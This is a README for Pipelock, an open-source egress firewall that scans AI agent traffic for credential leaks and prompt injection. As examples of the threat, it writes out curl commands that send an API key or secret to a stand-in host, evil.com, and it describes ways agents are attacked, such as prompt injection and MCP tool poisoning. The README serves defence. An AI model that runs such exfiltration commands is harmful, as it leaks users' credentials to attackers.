<p align="center">
  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
</p>

# Pipelock

<p align="center">
  <a href="https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml"><img alt="CI" src="https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml"><img alt="Security" src="https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/releases"><img alt="Release" src="https://img.shields.io/github/v/release/luckyPipewrench/pipelock"></a>
  <a href="LICENSE"><img alt="Core Apache 2.0" src="https://img.shields.io/badge/Core-Apache_2.0-blue.svg"></a>
  <a href="enterprise/LICENSE"><img alt="Enterprise ELv2" src="https://img.shields.io/badge/Enterprise-ELv2-orange.svg"></a>
  <a href="https://landscape.cncf.io/?item=provisioning--security-compliance--pipelock"><img alt="CNCF Landscape: Security &amp; Compliance" src="https://img.shields.io/badge/CNCF%20Landscape-Security%20%26%20Compliance-1a73e8?logo=cncf&logoColor=white"></a>
</p>

<p align="center">
  <a href="https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock"><img alt="OpenSSF Scorecard" src="https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge"></a>
  <a href="https://www.bestpractices.dev/projects/11948"><img alt="OpenSSF Best Practices" src="https://www.bestpractices.dev/projects/11948/badge?level=silver"></a>
  <a href="https://codecov.io/gh/luckyPipewrench/pipelock"><img alt="codecov" src="https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg"></a>
  <a href="https://goreportcard.com/report/github.com/luckyPipewrench/pipelock"><img alt="Go Report" src="https://goreportcard.com/badge/github.com/luckyPipewrench/pipelock"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/blob/main/.github/workflows/ci.yaml#L21-L35"><img alt="pipelock self-scanned" src="https://img.shields.io/badge/pipelock-self--scanned-00FFC8?style=flat&labelColor=1A1A2E&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNCAxNCI+PHBhdGggZmlsbD0iIzAwRkZDOCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik03IDAuNWMtMS45MyAwLTMuNSAxLjY2LTMuNSAzLjd2MS4zSDNjLS44MyAwLTEuNSAuNjctMS41IDEuNXY2YzAgLjgzLjY3IDEuNSAxLjUgMS41aDhjLjgzIDAgMS41LS42NyAxLjUtMS41VjdjMC0uODMtLjY3LTEuNS0xLjUtMS41aC0uNVY0LjJjMC0yLjA0LTEuNTctMy43LTMuNS0zLjdabS0yIDVWNC4yYzAtMS40OSAxLjEyLTIuNyAyLjUtMi43czIuNSAxLjIxIDIuNSAyLjd2MS4zSDVaTTIuNSA1aDJ2MS4yaC0yVjVabTcgMGgydjEuMmgtMlY1Wk03IDguMmMtLjY5IDAtMS4yNS41Ni0xLjI1IDEuMjUgMCAuNDQuMjMuODMuNTcgMS4wNXYxLjVoMS4zNnYtMS41Yy4zNC0uMjIuNTctLjYxLjU3LTEuMDUgMC0uNjktLjU2LTEuMjUtMS4yNS0xLjI1WiIvPjwvc3ZnPgo="></a>
</p>

**Open-source AI agent firewall for [Verifiable Egress Control (VEC)](https://pipelab.org/learn/verifiable-egress-control/).** Pipelock sits between AI agents and the network, scanning mediated HTTP, MCP, A2A, and WebSocket traffic for exfiltration and prompt-injection paths, and emitting mediator-signed [action receipts](https://pipelab.org/learn/action-receipt-spec/) that third parties can verify outside the agent runtime. Learn more: [Open-source AI firewall](https://pipelab.org/learn/open-source-ai-firewall/).

**Agent-external evidence built in.** Runtime logs and in-process receipts are useful telemetry. Pipelock receipts are signed by a mediator outside the agent process and outside its credentials, so verifiers can reason about the traffic that actually crossed the Pipelock boundary.

**Covers MCP security, agent egress security, DLP for AI agents, and prompt injection defense.** Pipelock acts as an agent egress proxy for wrapped outbound HTTP, WebSocket, and MCP traffic, with bidirectional MCP scanning, 62 credential patterns, and 29 injection patterns with 6-pass normalization.

**Works with:** Claude Code · OpenAI Codex · Cline · OpenCode · Zed · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph

[Quick Start](#quick-start) · [What It Does](#what-it-does) · [Docs](docs/) · [Blog](https://pipelab.org/blog/) · [Ask Dosu](https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask)

## The Problem

Your AI agent has `$ANTHROPIC_API_KEY` in its environment, plus shell access. One request is all it takes:

```bash
curl "https://evil.com/steal?key=$ANTHROPIC_API_KEY"   # game over, unless pipelock is watching
```

Every machine action your agent takes (HTTP requests, tool calls, browser sessions) should cross a boundary between your secrets and the open internet. Pipelock sits at that boundary when the agent is routed through its proxy, MCP wrapper, or containment topology. It scans mediated outbound and inbound requests, blocks exfiltration and injection, sandboxes the agent process where configured, and generates signed evidence of what happened.

![Pipelock demo](assets/demo.gif)

## Quick Start

```bash
# Install
brew install luckyPipewrench/tap/pipelock

# Set up (discovers IDE configs, generates config, verifies detection)
pipelock init

# Test it
pipelock check --url "https://evil.com/?k=AKIAIOSFODNN7EXAMPLE"  # blocked: AWS Access ID
pipelock check --url "https://docs.python.org/3/"                # allowed
```

<details>
<summary>Other install methods</summary>

```bash
# Download a binary (no dependencies)
# See https://github.com/luckyPipewrench/pipelock/releases

# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest

# From source (requires Go 1.25+)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest
```

</details>

<details>
<summary>Verify release integrity (SLSA provenance + SBOM)</summary>

```bash
gh attestation verify pipelock_*_linux_amd64.tar.gz --owner luckyPipewrench
gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:<version> --owner luckyPipewrench
```

</details>

## What It Does

Pipelock is an [AI egress proxy](https://pipelab.org/learn/ai-egress-proxy/) and [MCP security control](https://pipelab.org/learn/mcp-security/): it sits inline between your AI agent and the network, scans outbound and inbound traffic, and emits signed receipts plus mediation metadata for independent attestation.

### 11-Layer URL Scanner

Every request passes through: scheme validation, CRLF injection detection, path traversal blocking, domain blocklist, DLP pattern matching (62 built-in patterns for API keys, tokens, credentials, cryptocurrency keys, environment variable secrets, and financial identifiers with checksum validation), path entropy analysis, subdomain entropy analysis, SSRF protection with DNS rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets.

DLP runs before DNS resolution, designed to catch secrets before any DNS query leaves the proxy. BIP-39 seed phrase detection uses a dedicated scanner with dictionary lookup, sliding window matching, and SHA-256 checksum validation to catch cryptocurrency mnemonic exfiltration across all transport surfaces.

See [docs/bypass-resistance.md](docs/bypass-resistance.md) for the full evasion test matrix.

### Process Sandbox

Unprivileged process containment using OS-native kernel primitives. On Linux: Landlock LSM restricts filesystem access, seccomp filters dangerous syscalls, and network namespaces force all traffic through pipelock's scanner (no direct egress). On macOS: sandbox-exec profiles restrict filesystem and network. In containers, use `--best-effort` for Landlock + seccomp containment when namespace creation is restricted (network scanning uses proxy-based routing instead of kernel enforcement).

```bash
pipelock sandbox --config pipelock.yaml -- python agent.py
pipelock sandbox --best-effort -- python agent.py  # containers
pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
```

### Response Scanning

Fetched content is scanned for prompt injection and state/control poisoning before reaching the agent. A 6-pass normalization pipeline catches zero-width character evasion, homoglyph substitution, leetspeak encoding, and base64-wrapped payloads. 29 built-in patterns cover jailbreak phrases, instruction manipulation, credential solicitation, memory persistence, preference poisoning, covert action directives, model instruction boundaries, and CJK-language instruction overrides. Actions: `block`, `strip`, `warn`, or `ask` (human-in-the-loop terminal approval).

`text/event-stream` responses (OpenAI chat completions, Anthropic messages, Kilo Gateway, MCP HTTP/SSE) stream through with per-event DLP and injection scanning so token-by-token LLM chat UX is preserved while body scanning stays on. Clean events flush immediately; a detection terminates the stream fail-closed. Compressed SSE streams are rejected since compressed bytes evade regex matching. See [SSE streaming guide](docs/guides/sse-streaming.md).

### Request Body Scanning

Outbound request bodies and headers are scanned before they leave the protected agent path. Body scanning covers JSON keys and values, ordered multi-field JSON payloads, form-encoded bodies, raw text, reverse-proxy requests, intercepted CONNECT traffic, and outbound WebSocket client frames. In enforce mode, critical DLP findings and prompt-injection findings hard-block non-provider destinations with `X-Pipelock-Block-Reason` even when `request_body_scanning.action: warn`; provider exemptions still use the existing wildcard-aware response-scanning exemption list.

### Request Redaction

Optional request-side redaction rewrites matched JSON values before they leave the agent. The same matcher covers HTTP request bodies, outbound WebSocket client messages, and MCP `tools/call` `params.arguments` across stdio, HTTP/SSE, and WebSocket transports. Replacements are typed placeholders such as `<pl:aws-access-key:1>`, and signed action receipts record only the active profile plus per-class counts.

### MCP Proxy

Wraps any MCP server with bidirectional scanning. Three transport modes: stdio subprocess wrapping, Streamable HTTP bridging, and HTTP reverse proxy. Scans both directions: client requests checked for DLP leaks, server responses scanned for injection, and `tools/list` responses checked for poisoned descriptions and mid-session rug-pull changes.

```bash
# Wrap a local MCP server (stdio)
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Proxy a remote MCP server (HTTP)
pipelock mcp proxy --upstream http://localhost:8080/mcp

# Combined mode (fetch/forward proxy + MCP on separate ports)
pipelock run --config pipelock.yaml --mcp-listen 0.0.0.0:8889 --mcp-upstream http://localhost:3000/mcp
```

### MCP Tool Policy

Pre-execution rules that block dangerous tool calls before they reach MCP servers. Ships with 17 built-in rules covering destructive operations, credential access, reverse shells, persistence mechanisms, and encoded command execution. Shell obfuscation detection is built-in. v2.0 adds a `redirect` action that routes dangerous operations through audited wrappers instead of blocking outright.

### Tool Call Chain Detection

Detects attack patterns in sequences of MCP tool calls. Ships with 10 built-in patterns covering reconnaissance, credential theft, data staging, persistence, and exfiltration chains. Uses subsequence matching with configurable gap tolerance, so inserting innocent calls between attack steps doesn't evade detection.

### Kill Switch

Emergency deny-all with four independent activation sources: config file, SIGUSR1, sentinel file, and remote API. Any one active blocks all traffic. The API can run on a separate port so agents can't deactivate their own kill switch.

```bash
# Activate from operator machine
curl -X POST http://localhost:9090/api/v1/killswitch \
  -H "Authorization: Bearer TOKEN" -d '{"active": true}'
```

### Scan API

Evaluation endpoint for programmatic scanning. Any tool, pipeline, or control plane can submit URLs, text, or tool calls and get a structured verdict back (the proxy doesn't need to be in the request path). Four scan kinds: `url`, `dlp`, `prompt_injection`, and `tool_call`. Returns findings with scanner type, rule ID, and severity. Bearer token auth, per-token rate limiting, and Prometheus metrics.

See [docs/scan-api.md](docs/scan-api.md) for the full API reference.

### Address Protection

Detects blockchain address poisoning attacks where a lookalike address is substituted for a legitimate one. Validates addresses for ETH, BTC, SOL, and BNB chains, compares against a user-supplied allowlist, and flags similar addresses using prefix/suffix fingerprinting. Designed for agents that interact with DeFi protocols or execute transactions.

### Filesystem Sentinel

Monitors agent working directories for secrets written to disk. When an MCP subprocess writes a file containing credentials, pipelock detects it using the same DLP patterns applied to network traffic. On Linux, process lineage tracking attributes file writes to the agent's process tree. See [docs/guides/filesystem-sentinel.md](docs/guides/filesystem-sentinel.md).

### Event Emission

Forward audit events to external systems (SIEM, webhook receivers, syslog). Events are fire-and-forget and never block the proxy. Each event includes a MITRE ATT&CK technique ID where applicable (T1048 for exfiltration, T1059 for injection, T1195.002 for supply chain).

See [docs/guides/siem-integration.md](docs/guides/siem-integration.md) for log schema, forwarding patterns, and example SIEM queries.

### Security Assessment

`pipelock assess` runs a four-stage security assessment against your deployment: attack simulation across DLP, prompt injection, tool poisoning, URL evasion, address poisoning, seed-phrase, skill poisoning, and split-payload categories; a config audit covering every shipped detection surface (DLP, MCP transport, contract gate, redaction, browser shield, mediation envelope, flight recorder, request body, cross-request, address protection, seed-phrase, git protection, file sentry); deployment verification (live probe of scanning and containment); and MCP server discovery (protection status across Claude Code, Cursor, VS Code, and other clients).

Critical exposures like unprotected MCP servers cap the grade regardless of numeric score.

```bash
pipelock assess init --config pipelock.yaml
pipelock assess run assessment-a1b2c3d4/
pipelock assess finalize assessment-a1b2c3d4/
```

The free summary shows your grade, section scores, and top findings. Licensed users get the full report with server-specific findings, remediation commands, and Ed25519-signed evidence.

![Pipelock Security Summary showing grade C (73/100) with compliance coverage, MCP protection, and detection scoring](docs/assets/assess-summary.png)

### Flight Recorder

Hash-chained JSONL evidence log with Ed25519-signed checkpoints and DLP redaction. Every proxy decision is recorded as a tamper-evident entry linked to the previous one. Action receipts provide cryptographically signed proof of each mediated action (what happened, what the verdict was, which policy was active), and request-side rewrites add a compact `redaction` summary block instead of storing plaintext secrets. Verify any receipt independently with `pipelock verify-receipt`.

### Canary Tokens

Synthetic secrets injected into the agent's environment. If pipelock detects a canary in outbound traffic, it proves the agent (or something in its chain) is exfiltrating environment variables. Ships with `pipelock canary` to generate config snippets.

### More Features

| Feature | What It Does |
|---------|-------------|
| **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
| **Diagnose** | `pipelock diagnose` runs 7 local checks to verify your config works end-to-end (no network required) |
| **Enforcement Doctor** (v2.5) | `pipelock doctor` reports configured-vs-enforceable status for proxying, TLS interception, request-body scanning, Browser Shield, MCP wrapping, MCP binary integrity, tool provenance, file_sentry, Sentry, and deployment-boundary signals. |
| **Request Body Injection Blocking** (v2.5) | Request-body prompt-injection and critical-DLP findings hard-block non-provider destinations in enforce mode across forward, reverse, TLS-intercept, and WebSocket transports, with block-reason headers for operator-visible diagnosis. |
| **Request Policy** (v2.6) | Allow-by-default deny/warn rails on outbound API *operations*: match a request on route plus a GraphQL operation predicate and block the dangerous ones. Enforces across every HTTP egress transport, recurses into JSON `$batch` envelopes, fails closed on unparseable or opaque bodies, and runs before the contract gate. See the [request policy guide](docs/guides/request-policy.md). |
| **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` trusts it system-wide. |
| **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses |
| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config |
| **Config Scoring** (v2.6) | `pipelock audit score --config pipelock.yaml` evaluates security posture across 23 categories with a 170-point budget and letter grade. Flags overpermissive tool policies and stale coverage across newly shipped detection surfaces. |
| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files |
| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before they're committed |
| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust |
| **Session Profiling** | Per-session behavioral analysis (domain bursts, volume spikes) |
| **Adaptive Enforcement** | Per-session threat score with automatic escalation from warn to block, de-escalation timers, and domain burst detection |
| **Adaptive Operator CLI** (v2.5) | `pipelock adaptive status / flush / whoami` exposes runtime adaptive state through the authenticated admin API. See [`docs/cli/adaptive.md`](docs/cli/adaptive.md). |
| **Finding Suppression** | Silence known false positives via config rules or inline `pipelock:ignore` comments |
| **Multi-Agent Support** | Agent identification via `X-Pipelock-Agent` header for per-agent filtering |
| **Fleet Monitoring** | Prometheus metrics + ready-to-import [Grafana dashboard](configs/grafana-dashboard.json) |
| **A2A Scanning** | Agent Card poisoning detection, card drift monitoring, session smuggling prevention for Google's Agent-to-Agent protocol |
| **Behavioral Baseline** | Profile-then-lock for MCP tool behavior. Learns normal patterns during a window, flags deviations after ratification. |
| **Denial-of-Wallet** | Per-agent budgets for retries, fan-out, and concurrent tool calls. Catches loop storms and amplification attacks. |
| **Taint Escalation** | Exposure-based policy escalation across MCP + task boundaries. Sessions that recently observed untrusted content get elevated scanning on protected operations until trust is explicitly restored. |
| **Mediation Envelope** | RFC 8941 sideband metadata on forwarded HTTP requests and MCP `_meta`, carrying action type, verdict, actor identity, policy hash, taint context, and receipt correlation ID. v2.4 adds inbound verification with replay protection, SPIFFE actor format, and an RFC 9421 well-known signing-key directory at `/.well-known/http-message-signatures-directory`. See [federation guide](docs/guides/federation.md). |
| **Receipt Conformance** | Cross-implementation receipt verification suite (`sdk/conformance/`) plus the reference Python verifier ([pipelock-verify-python](https://github.com/luckyPipewrench/pipelock-verify-python)), so receipts can be verified outside the Go implementation. v2.4 adds `EvidenceReceipt v2` for learn-and-lock lifecycle and shadow evidence; the standalone Go `pipelock-verifier` verifies individual v2 receipts and v2 receipt chains with a pinned public key. v2.5 adds first-party Go, TypeScript, and Rust verifiers for Audit Packet v0. Python Audit Packet verification and non-Go EvidenceReceipt v2 chain verification remain follow-up work. |
| **Learn-and-Lock** (v2.4) | Per-agent behavioral contracts: observe an agent's real traffic, compile a signed candidate contract, replay captured observations in shadow, ratify per rule, promote the signed active manifest, and **enforce live** on every URL-bearing transport plus the MCP tool-call surface (forward, reverse + redirect, intercept, /fetch, WebSocket, MCP HTTP, MCP stdio bridge, MCP stdio subprocess). Lifecycle, shadow, and runtime `proxy_decision` receipts use `EvidenceReceipt v2`; shadow receipts are bound to the candidate contract hash, while lifecycle/runtime receipts are bound to the active manifest hash after promotion. Scanner block always wins over contract allow on every gated path. See [learn-and-lock guide](docs/guides/learn-and-lock.md). |
| **Block-Reason Header** (v2.4) | `X-Pipelock-Block-Reason` response header on every HTTP-capable block path (forward / intercept / fetch / reverse / MCP HTTP / WebSocket close-frame payload) with a fixed reason vocabulary, severity tier, and retry hint. MCP-internal JSON-RPC blocks (`tool_poisoning`, `tool_chain_blocked`, MCP stdio) carry the same reason vocabulary on the JSON-RPC error metadata where there is no HTTP response surface. Lets agents react intelligently to a block without parsing the body. See [block-reason header](docs/guides/block-reason-header.md). |
| **Wedge-Detection Watchdog** (v2.4) | `health_watchdog` returns `/health` 503 when a subsystem heartbeat goes stale (proxy hot path, MCP listeners, rules-engine reload watcher), so cluster liveness probes detect a wedged scanner automatically. Optional `expose_subsystems: true` adds a per-subsystem map for operator dashboards. See [health endpoint guide](docs/guides/health.md). |
| **Redaction Provider Plugin Shape** (v2.4) | First-party redaction parsers ship for Anthropic, OpenAI, and Gemini chat APIs. The provider-plugin shape (`internal/redact/providers.go::DefaultProviderSpecs()`) lets a third-party LLM provider register a body parser without forking the redact package. Wired through forward / intercept / reverse / WebSocket transports. |
| **Audit Packet v0 Schema + Verifiers** (v2.5) | First-party canonical Audit Packet schema with Go, TypeScript, and Rust verifier implementations, plus a standalone [`pipelock-verifier`](cmd/pipelock-verifier/) CLI. Auditors, SIEMs, and procurement reviewers validate signed evidence without running Pipelock. Schema lives under [`sdk/audit-packet/`](sdk/audit-packet/); verifier packages live under [`sdk/verifiers/`](sdk/verifiers/). |
| **Host Containment Lifecycle** (v2.5) | `pipelock contain install / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` manages a 3-UID containment model (operator / pipelock-proxy / pipelock-agent) end to end. nftables owner-match rules force the contained agent user through Pipelock on loopback; install pins the binary hash for TOFU integrity checks, and workspace ACL subcommands grant/revoke project access without opening system paths by default. See [`docs/contain-cli.md`](docs/contain-cli.md). |
| **MCP Integrity Manifests** (v2.5) | `pipelock mcp integrity manifest generate / verify / sign / verify-signature` pins MCP server binaries/scripts by hash and can require a trusted manifest signature before subprocess launch. See [`docs/cli/mcp-integrity.md`](docs/cli/mcp-integrity.md). |
| **Kubernetes MCP Launcher Contract** (v2.5) | `pipelock init sidecar --mcp-upstream` emits the companion MCP listener, service port, workload annotations, NetworkPolicy allowance, `PIPELOCK_MCP_PROXY_URL`, and mounted `PIPELOCK_MCP_CONFIG`. The agent launcher or MCP client must consume one of those values for MCP traffic to traverse Pipelock. See [`docs/cli/init-sidecar.md`](docs/cli/init-sidecar.md). |
| **Federation Strict Mode** (v2.5) | Inbound mediation-envelope verification now requires SPIFFE-format actors by default, contract tombstones are enforced at activation and accepted-load time, and a new `pipelock envelope trust add/list/remove/verify` operator CLI manages the local trust list. See [federation guide](docs/guides/federation.md). |
| **Media Policy** | Controls media response handling: strips steganographic metadata from JPEG/PNG (byte-level surgery, pixel-identical output), rejects audio/video by default, hardens SVG active content (foreignObject, event handlers, external hrefs), and enforces image size limits against decompression bombs. |
| **Compliance Mappings** | OWASP MCP Top 10, OWASP Agentic Top 15, NIST 800-53, EU AI Act, SOC 2 coverage documentation |

![Pipelock Agent Egress Report showing risk rating, timeline, findings by category, and evidence appendix](examples/sample-report.png)

![Pipelock Fleet Monitor: Grafana dashboard showing traffic, security events, and WebSocket metrics](docs/assets/fleet-dashboard.jpg)

## How It Works

Pipelock uses **capability separation**: in an enforced deployment, the agent process has secrets but no direct network access. Pipelock has network access but no agent secrets. Even if the agent gets prompt-injected, it can't reach the firewall's controls.

Three HTTP proxy modes (same port), plus dedicated MCP and A2A proxies:

- **Fetch proxy** (`/fetch?url=...`): Fetches the URL, extracts text, scans for injection, returns clean content.
- **Forward proxy** (`HTTPS_PROXY`): Standard HTTP CONNECT tunneling. Zero code changes. Optional TLS interception for full payload scanning.
- **WebSocket proxy** (`/ws?url=ws://...`): Bidirectional frame scanning with DLP + injection detection.
- **MCP proxy** (`pipelock mcp proxy`): Wraps stdio or HTTP MCP servers with bidirectional scanning.
- **A2A proxy**: Inspects Google Agent-to-Agent protocol traffic.

```mermaid
flowchart LR
    subgraph PRIV["PRIVILEGED ZONE"]
        Agent["AI Agent\nAPI keys + credentials + source code\nNetwork-isolated by deployment"]
    end

    subgraph FW["FIREWALL ZONE"]
        Proxy["Pipelock\n11-layer scanner pipeline\nNo agent secrets"]
    end

    subgraph NET["INTERNET"]
        Web["APIs + MCP Servers + Web"]
    end

    Agent -- "fetch / CONNECT / ws / MCP / A2A" --> Proxy
    Proxy -- "scanned request" --> Web
    Web -- "response" --> Proxy
    Proxy -- "scanned content" --> Agent

    style PRIV fill:#2d1117,stroke:#f85149,color:#e6edf3
    style FW fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style NET fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
    style Agent fill:#1a1a2e,stroke:#f85149,color:#e6edf3
    style Proxy fill:#0d2818,stroke:#3fb950,color:#e6edf3
    style Web fill:#0d1b2e,stroke:#58a6ff,color:#e6edf3
```

<details>
<summary>Text diagram (for terminals)</summary>

```
┌──────────────────────┐         ┌───────────────────────┐
│  PRIVILEGED ZONE     │         │  FIREWALL ZONE        │
│                      │         │                       │
│  AI Agent            │  IPC    │  Pipelock             │
│  - Has API keys      │────────>│  - No agent secrets   │
│  - Has credentials   │ fetch / │  - Full internet      │
│  - Restricted network│ CONNECT │  - Returns text       │
│                      │ /ws/MCP │  - WS frame scanning  │
│                      │<────────│  - URL scanning       │
│                      │ content │  - Audit logging      │
│                      │         │                       │
└──────────────────────┘         └───────────────────────┘
```

</details>

## Security Matrix

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

For agents running uncensored or abliterated models (e.g. OBLITERATUS), the [`hostile-model` preset](configs/hostile-model.yaml) layers additional defenses on top of strict mode: aggressive entropy thresholds (3.0), blanket network tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains (currently dependency-based detection).

What each mode prevents, detects, or logs:

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** (DLP scan) | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** (entropy scan) | Logged |
| DNS tunneling | **Prevented** | **Detected** (subdomain entropy) | Logged |
| Chunked exfiltration | **Prevented** | **Detected** (rate + data budget) | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged (entropy flags it) | Logged |

> **Honest assessment:** Strict mode blocks outbound HTTP that traverses Pipelock except allowlisted API domains, so there is no exfiltration channel through the proxy itself. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`) or the host/cluster containment topology enforced, pipelock adds an OS or deployment boundary on top of content inspection. Direct egress still has to be blocked by that boundary for non-cooperative tools that ignore proxy settings.

## Configuration

Generate a config from one of three CLI presets, or let `pipelock audit` tailor one to your project:

```bash
pipelock generate config --preset balanced > pipelock.yaml
pipelock audit ./my-project -o pipelock.yaml
```

| CLI Preset | Mode | Action | Best For |
|------------|------|--------|----------|
| `balanced` | balanced | warn | General purpose (default) |
| `strict` | strict | block | High-security, regulated industries |
| `audit` | audit | warn | Log-only evaluation |

Four additional preset files ship in `configs/` for specific workflows:

| File | Mode | Best For |
|------|------|----------|
| `configs/claude-code.yaml` | balanced | Claude Code unattended |
| `configs/cursor.yaml` | balanced | Cursor IDE |
| `configs/generic-agent.yaml` | balanced | New agents (tuning phase) |
| `configs/hostile-model.yaml` | strict | Uncensored/abliterated models |

Config changes are picked up automatically via file watcher or SIGHUP. Full reference: **[docs/configuration.md](docs/configuration.md)**

For false positive tuning: **[docs/false-positive-tuning.md](docs/false-positive-tuning.md)**

## Integration Guides

- **[Claude Code](docs/guides/claude-code.md):** MCP proxy setup, `.claude.json` configuration
- **[OpenAI Codex](docs/guides/codex.md):** MCP proxy wrapping, forward proxy, sandbox integration
- **[Cline](docs/guides/cline.md):** MCP proxy wrapping for Cline's `mcp.json`
- **[OpenCode](docs/guides/opencode.md):** MCP proxy wrapping for OpenCode's local and remote MCP servers
- **[Zed](docs/guides/zed.md):** MCP proxy wrapping for Zed's `context_servers` block in `settings.json`
- **[OpenAI Agents SDK](docs/guides/openai-agents.md):** `MCPServerStdio`, multi-agent handoffs
- **[Google ADK](docs/guides/google-adk.md):** `McpToolset`, `StdioConnectionParams`
- **[AutoGen](docs/guides/autogen.md):** `StdioServerParams`, `mcp_server_tools()`
- **[CrewAI](docs/guides/crewai.md):** `MCPServerStdio` wrapping, `MCPServerAdapter`
- **[LangGraph](docs/guides/langgraph.md):** `MultiServerMCPClient`, `StateGraph`
- **[Hermes](docs/guides/hermes.md):** full-plugin coverage (default, plugin-visible tool surfaces) or lighter MCP-only wrapping for Nous Research's agent, with auth-header sidecar preservation
- **[JetBrains/Junie](docs/guides/jetbrains.md):** MCP proxy wrapping for IntelliJ, PyCharm, GoLand ([walkthrough](https://pipelab.org/learn/jetbrains-integration/))
- **Cursor:** use `configs/cursor.yaml` with the same MCP proxy pattern as [Claude Code](docs/guides/claude-code.md) ([walkthrough](https://pipelab.org/learn/cursor-integration/))
- **[OpenClaw](docs/guides/openclaw.md):** Gateway sidecar, init container, config wrapping

## Deployment

```bash
# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest
docker run -p 8888:8888 -v ./pipelock.yaml:/config/pipelock.yaml:ro \
  ghcr.io/luckypipewrench/pipelock:latest \
  run --config /config/pipelock.yaml --listen 0.0.0.0:8888

# Network-isolated agent (Docker Compose)
pipelock generate docker-compose --agent claude-code -o docker-compose.yaml
docker compose up

# Kubernetes (Helm)
helm install pipelock charts/pipelock/
```

Production recipes (Docker Compose with network isolation, Kubernetes sidecar + NetworkPolicy, iptables/nftables, macOS PF): **[docs/guides/deployment-recipes.md](docs/guides/deployment-recipes.md)**

## CI Integration

```yaml
# .github/workflows/pipelock.yaml
- uses: luckyPipewrench/pipelock@v2
  with:
    scan-diff: 'true'
    fail-on-findings: 'true'
```

Downloads a pre-built binary, runs `pipelock audit`, scans the PR diff for leaked secrets, and uploads the audit report as a workflow artifact. See [`examples/ci-workflow.yaml`](examples/ci-workflow.yaml) for a complete workflow.

### Runnable demo: tool-response injection

The [`examples/tool-response-injection/`](examples/tool-response-injection/) harness runs an end-to-end demo where an MCP tool with a harmless name and description hides a prompt-injection payload in its response. Pipelock blocks the response before it reaches the agent and emits signed action receipts that a third party can verify. The same demo runs against three transports with one shared signing key:

- MCP stdio (subprocess wrapping)
- MCP HTTP upstream (stdio-to-HTTP bridge)
- MCP HTTP reverse proxy

```bash
cd examples/tool-response-injection
python3 demo.py    # needs python3 + cryptography + pipelock on PATH
```

## Community Rules

Signed rule bundles add detection patterns beyond the 62 built-in defaults. 28 community rules across DLP, injection, and tool-poison categories:

```bash
pipelock rules install pipelock-community
```

See [docs/rules.md](docs/rules.md) for details.

## Comparison

| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
|---|---|---|---|---|
| Secret exfiltration prevention | Yes | Partial (proxy mode) | Partial (domain-level) | Yes |
| DLP + entropy analysis | Yes | No | No | Partial |
| Prompt injection detection | Yes | Yes | No | No |
| MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
| WebSocket proxy (frame scanning) | Yes | No | No | No |
| MCP HTTP transport (Streamable HTTP) | Yes | No | No | No |
| Emergency kill switch (4 sources) | Yes | No | No | No |
| Tool call chain detection | Yes | No | No | No |
| Process sandbox (no Docker) | Yes | No | No | Yes (kernel-level) |
| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel) |

Reference matrix: [docs/comparison.md](docs/comparison.md)

Canonical comparison hub: [AI runtime security comparison](https://pipelab.org/compare/)

<details>
<summary>OWASP Agentic Top 10 Coverage</summary>

| Threat | Coverage |
|--------|----------|
| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
